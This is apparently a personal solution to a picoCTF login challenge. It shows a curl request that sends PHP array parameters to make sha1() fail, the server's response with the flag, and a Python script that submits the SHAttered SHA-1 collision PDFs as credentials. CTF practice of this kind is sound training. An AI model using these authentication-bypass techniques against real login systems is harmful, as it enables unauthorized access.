 curl -X POST -d "username[]=1&pwd[]=2" http://verbal-sleep.picoctf.net:50765/impossibleLogin.php

<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body style="text-align:center;">
    <pre>
 _               _         _  __                                       
| |             (_)       (_)/ _|                                      
| | ___   __ _   _ _ __    _| |_   _   _  ___  _   _    ___ __ _ _ __  
| |/ _ \ / _` | | | '_ \  | |  _| | | | |/ _ \| | | |  / __/ _` | '_ \ 
| | (_) | (_| | | | | | | | | |   | |_| | (_) | |_| | | (_| (_| | | | |
|_|\___/ \__, | |_|_| |_| |_|_|    \__, |\___/ \__,_|  \___\__,_|_| |_|
          __/ |                     __/ |                              
         |___/                     |___/                               


    </pre>
    <br/>
    <form action="impossibleLogin.php" method="post">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="pwd">Password:</label><br>
        <input type="password" id="pwd" name="pwd"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>/var/www/html/impossibleLogin.php</b> on line <b>38</b><br />
picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}








other soltuion guessing 
import requests
import urllib.request

# Read first 500 bytes of each PDF from shattered.io
rotimi = urllib.request.urlopen("https://shattered.io/static/shattered-1.pdf").read()[:500]
letmein = urllib.request.urlopen("https://shattered.io/static/shattered-2.pdf").read()[:500]

# Send them as query parameters in a GET request
r = requests.post(
    'http://verbal-sleep.picoctf.net:63073/impossibleLogin.php',
    data={'username': rotimi, 'pwd': letmein}
)

print(r.text)

